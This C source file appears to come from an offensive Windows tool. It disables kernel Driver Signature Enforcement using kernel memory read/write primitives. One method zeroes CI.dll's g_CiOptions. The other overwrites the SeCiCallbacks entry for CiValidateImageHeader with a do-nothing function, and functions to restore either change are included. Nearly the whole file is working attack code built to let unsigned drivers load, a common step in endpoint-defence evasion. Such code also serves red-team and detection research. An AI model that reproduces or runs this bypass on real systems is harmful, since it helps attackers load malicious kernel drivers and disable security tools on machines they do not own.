#include <windows.h>
#include <winternl.h>

#include "CiOffsets.h"
#include "KernelDSE.h"
#include "KernelCallbacks.h"
#include "NtoskrnlOffsets.h"
#include "PrintFunctions.h"
#include "KernelMemoryPrimitives.h"
#include "KernelUtils.h"
#include "tchar.h"

BOOLEAN IsCiEnabled()
{
    SYSTEM_CODEINTEGRITY_INFORMATION CiInfo = { sizeof(SYSTEM_CODEINTEGRITY_INFORMATION) };
    const NTSTATUS Status = NtQuerySystemInformation(SystemCodeIntegrityInformation,
        &CiInfo,
        sizeof(CiInfo),
        NULL);
    if (!NT_SUCCESS(Status))
        printf_or_not("[-] Failed to query code integrity status: %08X\n", Status);

    return (CiInfo.CodeIntegrityOptions &
        (CODEINTEGRITY_OPTION_ENABLED | CODEINTEGRITY_OPTION_TESTSIGN)) == CODEINTEGRITY_OPTION_ENABLED;
}

DWORD64 FindCIBaseAddress() {
    DWORD64 CiBaseAddress = FindKernelModuleAddressByName(TEXT("CI.dll"));
    return CiBaseAddress;
}

/*
* Patches the gCiOptions global variable in CI.dll module to enable/disable DSE
* Warning: this technique does not work with KDP enabled (by default on Win 11).
*/
BOOL patch_gCiOptions(DWORD64 CiVariableAddress, ULONG CiOptionsValue, PULONG OldCiOptionsValue) {//PRFIX : not KDP proof
    *OldCiOptionsValue = ReadMemoryDWORD(CiVariableAddress);
    //printf("[+KERNELDSE] The value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, *OldCiOptionsValue);
    WriteMemoryDWORD(CiVariableAddress, CiOptionsValue);
    //printf("[+KERNELDSE] New value of gCI at 0x%llx is 0x%x.\n", CiVariableAddress, ReadMemoryDWORD64(CiVariableAddress));
    return TRUE;
}

BOOL disableDSEbyPatchingCiOptions(BOOL verbose, _Out_ ULONG* OldCiOptionsValue) {
    *OldCiOptionsValue = 0;
    if (!CiOffsetsAreLoaded()) {
        return FALSE;
    }
    DWORD64 CiBaseAddress = FindCIBaseAddress();
    if (!CiBaseAddress) {
        _putts_or_not(TEXT("[-] CI base address not found !\n"));
        return FALSE;
    }
    DWORD64 g_CiOptionsAddress = CiBaseAddress + g_ciOffsets.st.g_CiOptions;
    if (verbose)
        _tprintf_or_not(TEXT("[+] [DSE-g_CiOptions patching] CI.dll kernel base address found at 0x%llx. The g_CiOptions is at %llx !\n"), CiBaseAddress, g_CiOptionsAddress);

    ULONG CiOptionsValue = 0;
    return patch_gCiOptions(g_CiOptionsAddress, CiOptionsValue, OldCiOptionsValue);
}

BOOL reenableDSEbyPatchingCiOptions(ULONG OldCiOptionsValue) {
    if (!CiOffsetsAreLoaded()) {
        return FALSE;
    }
    DWORD64 CiBaseAddress = FindCIBaseAddress();
    if (!CiBaseAddress) {
        _putts_or_not(TEXT("[-] CI base address not found !\n"));
        return FALSE;
    }
    DWORD64 g_CiOptionsAddress = CiBaseAddress + g_ciOffsets.st.g_CiOptions;
    ULONG tmp;
    return patch_gCiOptions(g_CiOptionsAddress, OldCiOptionsValue, &tmp);
}

DWORD64 locateCiValidateImageHeaderEntry()
{
    DWORD64 seCiCallbacksAddr = FindNtoskrnlBaseAddress() + g_ntoskrnlOffsets.st.seCiCallbacks;
    _tprintf_or_not(TEXT("[*] [DSE-callback swapping] SeCiCallbacks array's address: %p\n"), (PVOID)seCiCallbacksAddr);

    DWORD64 ciValidateImageHeaderAddr = FindCIBaseAddress() + g_ciOffsets.st.CiValidateImageHeader;
    _tprintf_or_not(TEXT("[*] [DSE-callback swapping] Looking for entry equals to CiValidateImageHeader (%p)\n"), (PVOID)ciValidateImageHeaderAddr);

    DWORD64 zwFlushInstructionCache = GetKernelFunctionAddress("ZwFlushInstructionCache");
    if (zwFlushInstructionCache == 0) {
        return FALSE;
    }

    DWORD64 ciValidateImageHeaderEntryAddr = 0;
    for (DWORD64 i = 0; i < 0x100; i += 8) {
        DWORD64 entry = ReadMemoryDWORD64(seCiCallbacksAddr + i);
        DWORD64 driverOffset;
        TCHAR* driverEntry = FindDriverName(entry, &driverOffset);
        _tprintf_or_not(TEXT("[*] [DSE-callback swapping] [0x%016llx (seCiCallbacks + 0x%llx)]\t\t= 0x%016llx (%s + 0x%llx)\n"), seCiCallbacksAddr + i, i, entry, driverEntry, driverOffset);
        if (entry == ciValidateImageHeaderAddr || entry == zwFlushInstructionCache) {
            ciValidateImageHeaderEntryAddr = seCiCallbacksAddr + i;
            break;
        }
    }
    if (!ciValidateImageHeaderEntryAddr) {
        _tprintf_or_not(TEXT("[-] [DSE-callback swapping] Failed to locate an entry in SeCiCallbacks pointing at Ci!CiValidateImageHeader\n"));
        return 0;
    }

    _tprintf_or_not(TEXT("[*] [DSE-callback swapping] Found the Ci!CiValidateImageHeader in the array at %p\n"), (PVOID)ciValidateImageHeaderEntryAddr);

    return ciValidateImageHeaderEntryAddr;
}

/*
* Replace the entry in nt!SeCiCallbacks pointing at Ci!CiValidateImageHeader by ZwFlushInstructionCache,
* i.e. a function that does nothing but returning 0
*/
BOOL disableDSEbyCallbackSwapping(DWORD64* oldCiValidateImageHeaderEntryAddr) {
    DWORD64 ciValidateImageHeaderEntryAddr = locateCiValidateImageHeaderEntry();
    if (ciValidateImageHeaderEntryAddr == 0) {
        return FALSE;
    }

    // Resolving the kernel nt!zwFlushInstructionCache address
    DWORD64 zwFlushInstructionCache = GetKernelFunctionAddress("ZwFlushInstructionCache");
    if (zwFlushInstructionCache == 0) {
        return FALSE;
    }

    WriteMemoryDWORD64(ciValidateImageHeaderEntryAddr, zwFlushInstructionCache);
    _tprintf_or_not(TEXT("[+] Successfully disabled DSE by overwriting Ci!CiValidateImageHeader\n"));

    *oldCiValidateImageHeaderEntryAddr = ciValidateImageHeaderEntryAddr;

    return TRUE;
}

BOOL reenableDSEbyCallbackSwapping(DWORD64 ciValidateImageHeaderEntryAddr) {
    DWORD64 ciValidateImageHeaderAddr = FindCIBaseAddress() + g_ciOffsets.st.CiValidateImageHeader;

    WriteMemoryDWORD64(ciValidateImageHeaderEntryAddr, ciValidateImageHeaderAddr);
    _tprintf_or_not(TEXT("[+] Successfully reenabled DSE by restoring Ci!CiValidateImageHeader entry in SeCiCallbacks\n"));

    return TRUE;
}

ULONG g_OldCiOptionsValue;
DWORD64 oldCiValidateImageHeaderEntryAddr;
BOOL disableDSE(enum dseDisablingMethods_e method, BOOL verbose) {
    switch (method) {
    case G_CIOPTIONS_PATCHING:
        return disableDSEbyPatchingCiOptions(verbose, &g_OldCiOptionsValue);
    case CALLBACK_SWAPPING:
        return disableDSEbyCallbackSwapping(&oldCiValidateImageHeaderEntryAddr);
    default:
        _tprintf_or_not(TEXT("Invalid DSE disabling method, aborting..."));
        exit(1);
    }
}
BOOL reenableDSE(enum dseDisablingMethods_e method, BOOL verbose) {
    (void)verbose;
    switch (method) {
    case G_CIOPTIONS_PATCHING:
        return reenableDSEbyPatchingCiOptions(g_OldCiOptionsValue);
    case CALLBACK_SWAPPING:
        return reenableDSEbyCallbackSwapping(oldCiValidateImageHeaderEntryAddr);
    default:
        _tprintf_or_not(TEXT("Invalid DSE disabling method, aborting..."));
        exit(1);
    }
}